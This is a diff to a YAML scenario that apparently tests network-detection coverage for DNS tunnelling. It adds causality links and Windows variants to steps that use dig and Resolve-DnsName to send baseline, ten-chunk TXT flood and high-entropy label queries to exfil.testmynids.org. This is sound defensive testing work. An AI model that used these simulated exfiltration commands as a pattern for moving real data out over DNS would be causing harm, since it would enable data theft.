@@ -64,12 +64,26 @@ moat_tier: "LEAD"
 
 external_tools: []
 
+# ── Causality Group Owner ───────────────────────────────────────────────────
+# The DNS-tunnel implant is modeled as the EAL/foothold container: the
+# containerd-shim runtime OWNS the resolver-client (dig) process tree and is the
+# Causality Group Owner XDR blames for the chain — NOT the synthetic beacon. The
+# baseline resolution and the two deviation bursts are discrete dig execs on the
+# SAME host under the SAME base domain (exfil.testmynids.org); the pan_dns
+# sensor observes no direct fork between them, so they thread on the shared
+# host + base-domain entity (see the shared_entity pivots below) rather than
+# hanging as a star off the agent node.
+cgo_anchor:
+  image_name: "containerd-shim"
+  primary_username: "container-runtime"
+
 steps:
   - id: step-01
     name: "Establish the host DNS baseline resolution"
     command: "dig +short baseline.exfil.testmynids.org A || true; echo cortexsim-ndr-009-dns-baseline-established"
     identity: container-runtime
     mitre_technique: "T1071.004"
+    platforms: ["linux", "container", "macos"]
     expected_detections:
       - plane: NDR
         type: XQL
@@ -82,6 +96,17 @@ steps:
     command: "for i in 1 2 3 4 5 6 7 8 9 10; do dig +short chunk$i.exfil.testmynids.org TXT || true; done; echo cortexsim-ndr-009-dns-volume-flood-complete"
     identity: container-runtime
     mitre_technique: "T1048.003"
+    platforms: ["linux", "container", "macos", "windows"]
+    platform_variants:
+      windows: "foreach ($i in 1..10) { Resolve-DnsName -Type TXT \"chunk$i.exfil.testmynids.org\" -ErrorAction SilentlyContinue | Out-Null }; Write-Output 'cortexsim-ndr-009-dns-volume-flood-complete'"
+    causality:
+      # step-01 (learned baseline resolution) and this volume flood are separate
+      # dig execs on the SAME host under the SAME base domain — the pan_dns
+      # sensor sees no direct fork between them, only the shared source_ip +
+      # base-domain entity. The volume ABIOC anchors on that host + base-domain
+      # chain, so the edge is a shared_entity join, not a process fork.
+      parent_step: step-01
+      pivot: shared_entity
     expected_detections:
       - plane: NDR
         type: ABIOC
@@ -94,6 +119,17 @@ steps:
     command: "dig +short f8a2c9e1b4d7a0c3e6f9k2.exfil.testmynids.org TXT || true; dig +short a1b2c3d4e5f6a7b8c9d0e1x7.exfil.testmynids.org TXT || true; dig +short z9y8x7w6v5u4t3s2r1q0p3.exfil.testmynids.org TXT || true; echo cortexsim-ndr-009-high-entropy-burst-complete"
     identity: container-runtime
     mitre_technique: "T1071.004"
+    platforms: ["linux", "container", "macos", "windows"]
+    platform_variants:
+      windows: "foreach ($l in 'f8a2c9e1b4d7a0c3e6f9k2','a1b2c3d4e5f6a7b8c9d0e1x7','z9y8x7w6v5u4t3s2r1q0p3') { Resolve-DnsName -Type TXT \"$l.exfil.testmynids.org\" -ErrorAction SilentlyContinue | Out-Null }; Write-Output 'cortexsim-ndr-009-high-entropy-burst-complete'"
+    causality:
+      # The high-entropy label burst is carried BY the volume flood under the
+      # same base domain from the same host — the entropy ABIOC's causality
+      # anchor is "the query-volume burst that carries it". No direct process
+      # fork links the two dig execs; the pan_dns stitch is the shared
+      # host + base-domain entity, so the edge is shared_entity.
+      parent_step: step-02
+      pivot: shared_entity
     expected_detections:
       - plane: NDR
         type: ABIOC
@@ -111,6 +147,14 @@ steps:
     command: "echo cortexsim-ndr-009-cr-ndr-0009-stitched-dns-tunnel-incident"
     identity: container-runtime
     mitre_technique: "T1048.003"
+    platforms: ["linux", "container", "macos"]
+    causality:
+      # Correlation terminal — CR-NDR-0009 fuses the two ABIOC deviations from
+      # the SAME source host under the SAME base domain into one DNS-tunnel
+      # incident. The stitch is the host + base-domain entity the two ABIOCs
+      # share, so the edge is shared_entity onto the entropy-burst node.
+      parent_step: step-03
+      pivot: shared_entity
     expected_detections:
       - plane: NDR
         type: Correlation
